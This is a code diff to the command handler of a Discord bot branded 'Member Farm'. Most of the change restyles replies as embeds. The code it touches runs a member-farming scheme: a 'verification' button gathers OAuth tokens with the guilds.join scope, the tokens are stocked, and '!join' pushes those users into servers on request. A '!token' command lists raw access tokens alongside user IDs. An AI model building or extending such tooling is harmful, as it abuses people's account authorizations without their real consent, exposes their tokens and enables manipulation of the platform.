@@ -25,12 +25,9 @@ async function handleCommand(message, client) {
   const cmd = (args.shift() || '').toLowerCase();
   if (!cmd) return;
 
-  // Only !verify works outside main guild; everything else is main-guild only
   const mainGuild = config.MAIN_GUILD_ID || '1499704751481294878';
   if (cmd !== 'verify') {
-    if (!message.guild || message.guild.id !== mainGuild) {
-      return; // silent outside main server
-    }
+    if (!message.guild || message.guild.id !== mainGuild) return;
   }
 
   if (message.guild) {
@@ -43,9 +40,7 @@ async function handleCommand(message, client) {
   }
 
   const publicCmds = ['verify', 'bot', 'checkserver', 'help', 'join'];
-  if (!publicCmds.includes(cmd) && !(await perms.canUse(message.author.id, cmd)) && !perms.isOwner(message.author.id)) {
-    return;
-  }
+  if (!publicCmds.includes(cmd) && !(await perms.canUse(message.author.id, cmd)) && !perms.isOwner(message.author.id)) return;
 
   try {
     switch (cmd) {
@@ -65,11 +60,17 @@ async function handleCommand(message, client) {
         const now = Math.floor(Date.now() / 1000);
         let last24 = stats?.last_24h || 0;
         if (now - Number(stats?.last_24h_reset || 0) > 86400) last24 = 0;
-        await message.reply({ embeds: [new EmbedBuilder().setTitle('Auth Status').addFields(
-          { name: 'Current valid auths', value: String(total), inline: true },
-          { name: 'Added last 24h', value: String(last24), inline: true },
-          { name: 'All-time max', value: String(stats?.total_all_time || 0), inline: true }
-        ).setColor(0x5865f2)] });
+        const emb = new EmbedBuilder()
+          .setTitle('Auth Status')
+          .setColor(0x5865f2)
+          .addFields(
+            { name: 'Current Valid', value: `\`${total}\``, inline: true },
+            { name: 'Last 24h', value: `\`${last24}\``, inline: true },
+            { name: 'All-Time', value: `\`${stats?.total_all_time || 0}\``, inline: true }
+          )
+          .setFooter({ text: 'Member Farm' })
+          .setTimestamp();
+        await message.reply({ embeds: [emb] });
         break;
       }
       case 'restock': {
@@ -85,14 +86,19 @@ async function handleCommand(message, client) {
         for (const t of available.slice(0, n)) {
           await query('INSERT INTO stock (token_id) VALUES ($1) ON CONFLICT DO NOTHING', [t.id]);
         }
-        await message.reply(`Restocked **${n}** tokens into stock.`);
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Restock Complete').setColor(0x57f287).addFields(
+          { name: 'Added to Stock', value: `\`${n}\``, inline: true },
+          { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         logs.adminLog(client, 'Restock', `<@${message.author.id}> restocked ${n}`);
         break;
       }
       case 'stock': {
         if (!(await perms.canUse(message.author.id, 'stock')) && !perms.isOwner(message.author.id)) return;
         const count = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
-        await message.reply(`Current stock: **${count}**`);
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Stock').setColor(0x5865f2).addFields(
+          { name: 'Available', value: `\`${count}\``, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'remove': {
@@ -102,18 +108,99 @@ async function handleCommand(message, client) {
         const rows = await many('SELECT token_id FROM stock LIMIT $1', [n]);
         if (!rows.length) return message.reply('Stock is empty.');
         for (const r of rows) await query('DELETE FROM stock WHERE token_id = $1', [r.token_id]);
-        await message.reply(`Removed **${rows.length}** from stock.`);
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Stock Updated').setColor(0xed4245).addFields(
+          { name: 'Removed', value: `\`${rows.length}\``, inline: true },
+          { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'help': {
-        await message.reply({ embeds: [new EmbedBuilder().setTitle('Member Farm — Commands').setDescription([
-          '`!prefix set` `!auth` `!stock` `!restock` `!remove`',
-          '`!link` `!verify` `!bot` `!join` `!channel set #channel`',
-          '`!grant` `!permission` `!queue` `!checkserver` `!blacklist`',
-          '`!basesend set` `!send @role` `!verifyrole set` `!cooldown`',
-          '`!logfarm|logserver|logerrors|logadmin` `!logs status`',
-          '`!stats` `!profile` `!maintenance` `!server leave` `!announce` `!token`',
-        ].join('\n')).setColor(0x5865f2)] });
+        const emb = new EmbedBuilder()
+          .setTitle('Member Farm — Command Panel')
+          .setColor(0x5865f2)
+          .setDescription('All commands use the current prefix. Admin commands require grant or owner.')
+          .addFields(
+            {
+              name: 'Core',
+              value: [
+                '`!auth` — auth counts',
+                '`!stock` — current stock',
+                '`!restock <n>` — restock tokens',
+                '`!remove <n>` — remove from stock',
+                '`!link` / `!link define <url>`',
+                '`!verify` — OAuth verify button',
+                '`!bot` — add-bot invite button',
+                '`!join <serverID>` — request members',
+                '`!channel set #channel` — join channel',
+              ].join('\n'),
+            },
+            {
+              name: 'Permissions',
+              value: [
+                '`!grant @user <cmd|all>`',
+                '`!grant revoke @user <cmd|all>`',
+                '`!permission @user`',
+              ].join('\n'),
+              inline: true,
+            },
+            {
+              name: 'Queue',
+              value: [
+                '`!queue` · `!queue clear`',
+                '`!queue remove <id>`',
+                '`!queue info <id>`',
+                '`!queue priority <id>`',
+                '`!queue move <id> <pos>`',
+                '`!queue pause` · `resume`',
+              ].join('\n'),
+              inline: true,
+            },
+            {
+              name: 'Server',
+              value: [
+                '`!checkserver <id>`',
+                '`!blacklist <id> <reason>`',
+                '`!blacklist list` / `revoke`',
+                '`!server leave <id>`',
+                '`!announce <id|all> <msg>`',
+              ].join('\n'),
+              inline: true,
+            },
+            {
+              name: 'Config',
+              value: [
+                '`!prefix set <prefix>`',
+                '`!basesend set <n>`',
+                '`!send @role <n>`',
+                '`!verifyrole set @role`',
+                '`!cooldown <seconds>`',
+              ].join('\n'),
+              inline: true,
+            },
+            {
+              name: 'Logs',
+              value: [
+                '`!logfarm|logserver|logerrors|logadmin`',
+                '`enable` · `disable` · `set #ch`',
+                '`!logs status`',
+              ].join('\n'),
+              inline: true,
+            },
+            {
+              name: 'Admin',
+              value: [
+                '`!stats` — global stats',
+                '`!profile @user`',
+                '`!maintenance enable|disable`',
+                '`!maintenance allowed @user`',
+                '`!token` — owner only',
+              ].join('\n'),
+              inline: true,
+            }
+          )
+          .setFooter({ text: 'Member Farm' })
+          .setTimestamp();
+        await message.reply({ embeds: [emb] });
         break;
       }
       case 'bot': {
@@ -121,11 +208,10 @@ async function handleCommand(message, client) {
         const row = new ActionRowBuilder().addComponents(
           new ButtonBuilder().setLabel('Add Bot →').setStyle(ButtonStyle.Link).setURL(invite)
         );
-        const emb = new EmbedBuilder()
-          .setTitle('Add the Bot')
-          .setDescription('Click the button below to add the bot to your server.')
-          .setColor(0x5865f2);
-        await message.reply({ embeds: [emb], components: [row] });
+        await message.reply({
+          embeds: [new EmbedBuilder().setTitle('Add the Bot').setDescription('Click the button below to add the bot to your server.').setColor(0x5865f2).setFooter({ text: 'Member Farm' }).setTimestamp()],
+          components: [row],
+        });
         break;
       }
       case 'grant': {
@@ -135,13 +221,21 @@ async function handleCommand(message, client) {
           const what = (args[2] || 'all').toLowerCase().replace(/^!/, '');
           if (!user) return message.reply('Usage: !grant revoke @user <cmd|all>');
           await perms.revoke(user.id, what);
-          await message.reply(`Revoked \`${what}\` from <@${user.id}>`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Permission Revoked').setColor(0xed4245).addFields(
+            { name: 'User', value: `<@${user.id}>`, inline: true },
+            { name: 'Command', value: `\`${what}\``, inline: true },
+            { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else {
           const user = message.mentions.users.first();
           const what = (args[1] || 'all').toLowerCase().replace(/^!/, '');
           if (!user) return message.reply('Usage: !grant @user <cmd|all>');
           await perms.grant(user.id, what);
-          await message.reply(`Granted \`${what}\` to <@${user.id}>`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Permission Granted').setColor(0x57f287).addFields(
+            { name: 'User', value: `<@${user.id}>`, inline: true },
+            { name: 'Command', value: `\`${what}\``, inline: true },
+            { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -150,7 +244,11 @@ async function handleCommand(message, client) {
         if (!(await perms.canUse(message.author.id, 'permission')) && !perms.isOwner(message.author.id)) return;
         const user = message.mentions.users.first() || message.author;
         const list = await perms.listGrants(user.id);
-        await message.reply(`Permissions for <@${user.id}>: ${list.length ? list.map(c => `\`${c}\``).join(', ') : 'none'}`);
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('User Permissions').setColor(0x5865f2).addFields(
+          { name: 'User', value: `<@${user.id}>`, inline: true },
+          { name: 'User ID', value: `\`${user.id}\``, inline: true },
+          { name: 'Commands', value: list.length ? list.map(c => `\`${c}\``).join(', ') : '`none`' }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'link': {
@@ -159,12 +257,12 @@ async function handleCommand(message, client) {
           const url = args.slice(1).join(' ');
           if (!url) return message.reply('Usage: !link define <url>');
           await setSetting('oauth_link', url);
-          await message.reply('OAuth link defined.');
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('OAuth Link Defined').setColor(0x57f287).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else {
           const url = await getSetting('oauth_link', process.env.REDIRECT_URI
             ? `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`
             : 'Not configured');
-          await message.reply(`OAuth authorize link:\n${url}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('OAuth Authorize Link').setDescription(url).setColor(0x5865f2).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -174,7 +272,7 @@ async function handleCommand(message, client) {
         const url = await getSetting('oauth_link',
           `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI || '')}&response_type=code&scope=identify%20guilds.join`);
         const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('—> Verify').setStyle(ButtonStyle.Link).setURL(url));
-        await message.channel.send({ embeds: [new EmbedBuilder().setTitle('Account Verification').setDescription('Click to authorize (guilds.join).').setColor(0x57f287)], components: [row] });
+        await message.channel.send({ embeds: [new EmbedBuilder().setTitle('Account Verification').setDescription('Click the button below to authorize the bot (scope: guilds.join).').setColor(0x57f287).setFooter({ text: 'Member Farm' }).setTimestamp()], components: [row] });
         break;
       }
       case 'join': {
@@ -208,11 +306,12 @@ async function handleCommand(message, client) {
         await query(`INSERT INTO cooldowns (user_id, last_join) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET last_join = EXCLUDED.last_join`, [message.author.id, Date.now()]);
         await query(`INSERT INTO profiles (user_id, commands_used, last_command_at) VALUES ($1, 1, EXTRACT(EPOCH FROM NOW())::BIGINT)
           ON CONFLICT (user_id) DO UPDATE SET commands_used = profiles.commands_used + 1, last_command_at = EXTRACT(EPOCH FROM NOW())::BIGINT`, [message.author.id]);
-        await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Request Queued').addFields(
-          { name: 'Members to send', value: String(amount), inline: true },
-          { name: 'Target Server', value: targetId, inline: true },
-          { name: 'Queue position', value: `${q.position}/${config.QUEUE_MAX}`, inline: true }
-        ).setColor(0x57f287)] });
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Request Queued').setColor(0x57f287).addFields(
+          { name: 'Members to Send', value: `\`${amount}\``, inline: true },
+          { name: 'Server ID', value: `\`${targetId}\``, inline: true },
+          { name: 'Queue Position', value: `\`${q.position}/${config.QUEUE_MAX}\``, inline: true },
+          { name: 'Requested by', value: `<@${message.author.id}>`, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         logs.farmLog(client, 'Join queued', `User <@${message.author.id}> → guild ${targetId} x${amount}`);
         break;
       }
@@ -223,10 +322,15 @@ async function handleCommand(message, client) {
           if (!ch) return message.reply('Usage: !channel set #channel');
           await setSetting('special_channel', ch.id);
           await setSetting('special_channel_name', ch.name);
-          await message.reply(`Join channel set to ${ch}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Channel Set').setColor(0x57f287).addFields(
+            { name: 'Channel', value: `${ch}`, inline: true },
+            { name: 'Channel ID', value: `\`${ch.id}\``, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else {
           const id = await getSetting('special_channel', 'not set');
-          await message.reply(`Current join channel: ${id === 'not set' ? 'not set' : `<#${id}>`}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Join Channel').setColor(0x5865f2).addFields(
+            { name: 'Current', value: id === 'not set' ? '`not set`' : `<#${id}>` }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -236,7 +340,9 @@ async function handleCommand(message, client) {
           const n = parseInt(args[1], 10);
           if (isNaN(n) || n < 0) return message.reply('Invalid number');
           await setSetting('base_send', String(n));
-          await message.reply(`Base send set to **${n}**`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Base Send Updated').setColor(0x57f287).addFields(
+            { name: 'Amount', value: `\`${n}\``, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -246,7 +352,10 @@ async function handleCommand(message, client) {
         const n = parseInt(args[1], 10);
         if (!role || isNaN(n)) return message.reply('Usage: !send @role <number>');
         await query(`INSERT INTO role_bonus (role_id, bonus) VALUES ($1, $2) ON CONFLICT (role_id) DO UPDATE SET bonus = EXCLUDED.bonus`, [role.id, n]);
-        await message.reply(`Role ${role} will receive **+${n}** members per !join`);
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Role Bonus Set').setColor(0x57f287).addFields(
+          { name: 'Role', value: `${role}`, inline: true },
+          { name: 'Bonus Members', value: `\`+${n}\``, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'checkserver': {
@@ -257,12 +366,14 @@ async function handleCommand(message, client) {
         const stockC = (await one('SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1')).c;
         const joined = (await one('SELECT COUNT(*)::int AS c FROM joins WHERE guild_id = $1 AND success = 1', [gid])).c;
         const bl = await one('SELECT reason FROM blacklist WHERE guild_id = $1', [gid]);
-        await message.reply({ embeds: [new EmbedBuilder().setTitle(`Server ${g.name}`).addFields(
-          { name: 'Members', value: String(g.memberCount), inline: true },
-          { name: 'Members obtained', value: String(joined), inline: true },
-          { name: 'Current stock', value: String(stockC), inline: true },
-          { name: 'Blacklisted', value: bl ? `Yes — ${bl.reason}` : 'No' }
-        ).setColor(0x5865f2)] });
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Server Info').setColor(0x5865f2).addFields(
+          { name: 'Server Name', value: g.name, inline: true },
+          { name: 'Server ID', value: `\`${gid}\``, inline: true },
+          { name: 'Member Count', value: `\`${g.memberCount}\``, inline: true },
+          { name: 'Members Obtained', value: `\`${joined}\``, inline: true },
+          { name: 'Current Stock', value: `\`${stockC}\``, inline: true },
+          { name: 'Blacklisted', value: bl ? `Yes — ${bl.reason}` : 'No', inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'blacklist': {
@@ -270,18 +381,27 @@ async function handleCommand(message, client) {
           if (!(await perms.canUse(message.author.id, 'blacklist')) && !perms.isOwner(message.author.id)) return;
           const rows = await many('SELECT * FROM blacklist');
           if (!rows.length) return message.reply('No blacklisted servers.');
-          await message.reply(rows.map(r => `\`${r.guild_id}\` — ${r.reason}`).join('\n').slice(0, 1900));
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Blacklisted Servers').setColor(0xed4245).setDescription(
+            rows.map(r => `\`${r.guild_id}\` — ${r.reason}`).join('\n').slice(0, 4000)
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else if (args[0] === 'revoke') {
           if (!(await perms.canUse(message.author.id, 'blacklist')) && !perms.isOwner(message.author.id)) return;
           await query('DELETE FROM blacklist WHERE guild_id = $1', [args[1]]);
-          await message.reply(`Blacklist revoked for ${args[1]}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Blacklist Revoked').setColor(0x57f287).addFields(
+            { name: 'Server ID', value: `\`${args[1]}\``, inline: true },
+            { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else {
           if (!(await perms.canUse(message.author.id, 'blacklist')) && !perms.isOwner(message.author.id)) return;
           const gid = args[0];
-          const reason = args.slice(1).join(' ') || 'No reason';
+          const reason = args.slice(1).join(' ') || 'No reason provided';
           if (!gid) return message.reply('Usage: !blacklist <serverID> <reason>');
           await query(`INSERT INTO blacklist (guild_id, reason, added_by) VALUES ($1, $2, $3) ON CONFLICT (guild_id) DO UPDATE SET reason = EXCLUDED.reason`, [gid, reason, message.author.id]);
-          await message.reply(`Blacklisted ${gid}: ${reason}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Server Blacklisted').setColor(0xed4245).addFields(
+            { name: 'Server ID', value: `\`${gid}\``, inline: true },
+            { name: 'Reason', value: reason, inline: true },
+            { name: 'Action by', value: `<@${message.author.id}>`, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -291,7 +411,10 @@ async function handleCommand(message, client) {
           const role = message.mentions.roles.first();
           if (!role) return message.reply('Usage: !verifyrole set @role');
           await setSetting('verified_role', role.id);
-          await message.reply(`Verified role set to ${role}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Verified Role Set').setColor(0x57f287).addFields(
+            { name: 'Role', value: `${role}`, inline: true },
+            { name: 'Role ID', value: `\`${role.id}\``, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -305,20 +428,23 @@ async function handleCommand(message, client) {
           if (!ch) return message.reply(`Usage: ${prefix}${cmd} set #channel`);
           await setSetting(`log_${type}_channel`, ch.id);
           await setSetting(`log_${type}_enabled`, '1');
-          await message.reply(`${cmd} channel set to ${ch}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Log Channel Set').setColor(0x57f287).addFields(
+            { name: 'Type', value: `\`${type}\``, inline: true },
+            { name: 'Channel', value: `${ch}`, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
       case 'logs': {
         if (args[0] === 'status') {
           if (!(await perms.canUse(message.author.id, 'logs')) && !perms.isOwner(message.author.id)) return;
-          const lines = [];
+          const fields = [];
           for (const t of ['farm', 'server', 'errors', 'admin']) {
             const en = (await getSetting(`log_${t}_enabled`, '0')) === '1' ? 'ON' : 'OFF';
             const ch = await getSetting(`log_${t}_channel`, 'none');
-            lines.push(`**${t}**: ${en} → ${ch === 'none' ? 'none' : `<#${ch}>`}`);
+            fields.push({ name: t, value: `**${en}** → ${ch === 'none' ? '`none`' : `<#${ch}>`}`, inline: true });
           }
-          await message.reply(lines.join('\n'));
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Logs Status').setColor(0x5865f2).addFields(fields).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         }
         break;
       }
@@ -329,14 +455,14 @@ async function handleCommand(message, client) {
         const qC = (await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`)).c;
         const joins = (await one('SELECT COUNT(*)::int AS c FROM joins WHERE success = 1')).c;
         const users = (await one('SELECT COUNT(*)::int AS c FROM profiles')).c;
-        await message.reply({ embeds: [new EmbedBuilder().setTitle('Global Stats').addFields(
-          { name: 'Valid auths', value: String(tokens), inline: true },
-          { name: 'Stock', value: String(stockC), inline: true },
-          { name: 'Queue', value: String(qC), inline: true },
-          { name: 'Bot guilds', value: String(client.guilds.cache.size), inline: true },
-          { name: 'Successful joins', value: String(joins), inline: true },
-          { name: 'Tracked users', value: String(users), inline: true }
-        ).setColor(0xfaa61a)] });
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Global Stats').setColor(0xfaa61a).addFields(
+          { name: 'Valid Auths', value: `\`${tokens}\``, inline: true },
+          { name: 'Stock', value: `\`${stockC}\``, inline: true },
+          { name: 'Queue', value: `\`${qC}\``, inline: true },
+          { name: 'Bot Guilds', value: `\`${client.guilds.cache.size}\``, inline: true },
+          { name: 'Successful Joins', value: `\`${joins}\``, inline: true },
+          { name: 'Tracked Users', value: `\`${users}\``, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'queue': {
@@ -344,8 +470,10 @@ async function handleCommand(message, client) {
         const sub = (args[0] || '').toLowerCase();
         if (!sub) {
           const rows = await queue.getQueue();
-          if (!rows.length) return message.reply('Queue empty.');
-          await message.reply(rows.map(r => `#${r.position} \`${r.guild_id}\` x${r.amount}`).join('\n'));
+          if (!rows.length) return message.reply({ embeds: [new EmbedBuilder().setTitle('Queue').setDescription('Queue empty.').setColor(0x5865f2).setFooter({ text: 'Member Farm' }).setTimestamp()] });
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Queue').setColor(0x5865f2).setDescription(
+            rows.map(r => `**#${r.position}** \`${r.guild_id}\` ×${r.amount}`).join('\n')
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else if (sub === 'clear') {
           const id = `clearq_${Date.now()}`;
           client.pendingConfirms.set(id, { action: 'queue_clear', author: message.author.id });
@@ -354,7 +482,12 @@ async function handleCommand(message, client) {
         else if (sub === 'info') {
           const row = await one(`SELECT * FROM queue WHERE guild_id = $1 AND status = 'pending'`, [args[1]]);
           if (!row) return message.reply('Not in queue');
-          await message.reply(`Guild ${args[1]} — pos ${row.position}, amount ${row.amount}`);
+          await message.reply({ embeds: [new EmbedBuilder().setTitle('Queue Entry').setColor(0x5865f2).addFields(
+            { name: 'Server ID', value: `\`${args[1]}\``, inline: true },
+            { name: 'Position', value: `\`${row.position}\``, inline: true },
+            { name: 'Amount', value: `\`${row.amount}\``, inline: true },
+            { name: 'Requested by', value: `<@${row.requester_id}>`, inline: true }
+          ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         } else if (sub === 'priority') { await queue.setPriority(args[1]); await message.reply('Priority set'); }
         else if (sub === 'move') { await message.reply((await queue.moveQueue(args[1], parseInt(args[2], 10))) ? 'Moved' : 'Not found'); }
         else if (sub === 'pause') { await queue.pauseQueue(); await message.reply('Queue paused'); }
@@ -363,8 +496,8 @@ async function handleCommand(message, client) {
       }
       case 'maintenance': {
         if (!perms.isOwner(message.author.id) && !(await perms.canUse(message.author.id, 'maintenance'))) return;
-        if (args[0] === 'enable') { await setSetting('maintenance', '1'); await message.reply('Maintenance **enabled**'); }
-        else if (args[0] === 'disable') { await setSetting('maintenance', '0'); await message.reply('Maintenance **disabled**'); }
+        if (args[0] === 'enable') { await setSetting('maintenance', '1'); await message.reply({ embeds: [new EmbedBuilder().setTitle('Maintenance Enabled').setColor(0xfaa61a).setFooter({ text: 'Member Farm' }).setTimestamp()] }); }
+        else if (args[0] === 'disable') { await setSetting('maintenance', '0'); await message.reply({ embeds: [new EmbedBuilder().setTitle('Maintenance Disabled').setColor(0x57f287).setFooter({ text: 'Member Farm' }).setTimestamp()] }); }
         else if (args[0] === 'allowed') {
           const u = message.mentions.users.first();
           if (!u) return message.reply('Usage: !maintenance allowed @user');
@@ -391,11 +524,14 @@ async function handleCommand(message, client) {
         if (!(await perms.canUse(message.author.id, 'profile')) && !perms.isOwner(message.author.id)) return;
         const user = message.mentions.users.first() || message.author;
         const p = (await one('SELECT * FROM profiles WHERE user_id = $1', [user.id])) || { members_received: 0, commands_used: 0, last_command_at: null };
-        await message.reply({ embeds: [new EmbedBuilder().setTitle(`Profile — ${user.tag}`).addFields(
-          { name: 'Members received', value: String(p.members_received), inline: true },
-          { name: 'Commands used', value: String(p.commands_used), inline: true },
-          { name: 'Last command', value: p.last_command_at ? `<t:${p.last_command_at}:R>` : 'never', inline: true }
-        ).setColor(0x5865f2)] });
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('User Profile').setColor(0x5865f2).addFields(
+          { name: 'User', value: `<@${user.id}>`, inline: true },
+          { name: 'User ID', value: `\`${user.id}\``, inline: true },
+          { name: 'Username', value: user.tag, inline: true },
+          { name: 'Members Received', value: `\`${p.members_received}\``, inline: true },
+          { name: 'Commands Used', value: `\`${p.commands_used}\``, inline: true },
+          { name: 'Last Command', value: p.last_command_at ? `<t:${p.last_command_at}:R>` : '`never`', inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'announce': {
@@ -422,7 +558,9 @@ async function handleCommand(message, client) {
         const sec = parseInt(args[0], 10);
         if (isNaN(sec) || sec < 0) return message.reply('Usage: !cooldown <seconds>');
         await setSetting('cooldown_ms', String(sec * 1000));
-        await message.reply(`Join cooldown set to **${sec}s**`);
+        await message.reply({ embeds: [new EmbedBuilder().setTitle('Cooldown Updated').setColor(0x57f287).addFields(
+          { name: 'Seconds', value: `\`${sec}\``, inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()] });
         break;
       }
       case 'token': {
@@ -433,7 +571,7 @@ async function handleCommand(message, client) {
         for (let i = 0; i < tokens.length; i += 5) {
           const chunk = tokens.slice(i, i + 5);
           pages.push(new EmbedBuilder().setTitle(`Tokens (${i / 5 + 1}/${Math.ceil(tokens.length / 5)})`)
-            .setDescription(chunk.map(t => `**#${t.id}** \`${t.user_id}\`\n\`${t.access_token}\``).join('\n\n')).setColor(0xed4245));
+            .setDescription(chunk.map(t => `**#${t.id}** \`${t.user_id}\`\n\`${t.access_token}\``).join('\n\n')).setColor(0xed4245).setFooter({ text: 'Member Farm' }).setTimestamp());
         }
         const row = new ActionRowBuilder().addComponents(
           new ButtonBuilder().setCustomId('token_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
